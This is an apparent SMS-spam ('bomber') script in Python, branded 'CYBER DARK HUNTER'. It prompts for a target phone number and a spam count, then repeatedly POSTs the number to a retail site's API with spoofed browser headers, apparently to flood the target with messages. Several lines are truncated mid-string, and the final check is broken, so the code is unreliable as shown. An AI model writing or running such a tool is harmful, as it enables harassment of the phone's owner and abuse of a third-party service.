import json
import requests
import sys
import os



def main():
        os.system('clear')
        os.system('figlet CYBER DARK HUNTER')
        banner = '''
\033[1;93mIndihome.     [+]YT Meydhi Ari Nugroho
\033[1;93mAxis               [+]CYBER DARK HUNTER
\033[1;93mXl                   [+]cyberdarkhunter@gmail.com
\033[1;92mSmarflen       [+]SUBSCRIBE
\033[1;92Telkomsel
         '''

        print(banner)
        no = input('target : ')
        jum = input('Jumlah Spam : ')

        head = {
        "User-Agent": "Mozilla/5.0 (Linux; Androi>
        "Referer": "https://www.mapclub.com/en/us>
        "Host": "cmsapi.mapclub.com",
        }


        dat = {
        'phone' : no
        }

        for x in range(int(jum)):
                leosureo = requests.post("https:/>
        if 'eror' in leosureo: